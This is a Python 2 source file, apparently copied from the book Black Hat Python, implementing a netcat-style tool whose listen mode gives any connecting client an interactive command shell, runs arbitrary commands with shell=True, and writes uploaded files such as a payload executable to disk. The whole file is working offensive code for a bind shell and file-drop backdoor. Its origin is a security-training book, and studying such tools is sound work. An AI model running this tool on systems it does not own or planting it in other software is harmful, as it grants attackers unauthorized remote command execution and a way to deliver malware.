#!/usr/bin/env python

#From BlackHat Python

import sys,socket,getopt,threading,subprocess

#Defining global variables
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print "Black Hat Python NetCat tool"
    print ""
    print "    Usage: bhpnet.py -t target_host -p port"
    print "-l   --Listen on [host]:[port] for incoming connections           "
    print "-e   --execute=file_to_run  - execute a file                      "
    print "-c   --command              - initialize a command shell          "
    print "-u   --upload = destination - upload a file to the destination    "
    print "-t   --target    -p  --port                                       "
    print ""
    print "bhpnet.py -t <target> -p 5555 -l -u=c:\\payload.exe               "
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    print "./bhpnet.py -l -p 9999 -c (listens on port 9999)                  "
    print "./bhpnet.py -t localhost -p 9999 (targets localhost on port 9999) "
    print ""
    #sys.exit(0)

def run_command(command):
    #trim the newline
    command = command.rstrip()

    #run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell = True)
    except:
        output = "Failed to execute command.\r\n"
    return output               #send output to the client

def client_handler(client_socket):
    global upload
    global execute
    global command

    #check for upload
    if len(upload_destination):

        #read in all of the bytes and write to our destination
        file_buffer = ""

        #keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                    break
            else:
                file_buffer += data

        #now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    #click for command execution
    if len(execute):
        #run the command
        output = run_command(execute)
        client_socket.send(output)

    #now we go into another loop if a command shell was requested
    if command:
        while True:
            prompt = "<BHPNet:#> "
            client_socket.send(prompt)
            cmd_buffer = ""                 #now we receive until we ses a linefeed(enter key)          
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            #send back the command output
            response = run_command(cmd_buffer)
            #send back the response
            client_socket.send(response)

def server_loop():
    global target
    global port

    #if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #connect to our target host
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:                      #Wait for the data back
            recv_len = 1
            response = ""

            while recv_len:
                data     = client.recv(4096)
                recv_len = len(data)
                response+= data
                if recv_len < 4096:
                    break

            print response,    
            buffer = raw_input("")      #wait for more input
            buffer += "\n"
            client.send(buffer)        #send it off

    except:
        print "[*] Exception! Exiting."

        #tear down the connection
        client.close()

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    #read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
           execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:             #listen or just send data from input
        #read in the buffer from the commandline
        #this will block, so send CTRL-D if not sending input
        #to stdin
        buffer = sys.stdin.read()

        #send data off
        client_sender(buffer)
    #we are going to listen and potentially upload things, execute commands
    #and drop a shell back depending on our command line options above
    if listen:
        server_loop()
if __name__ == "__main__":
  main()
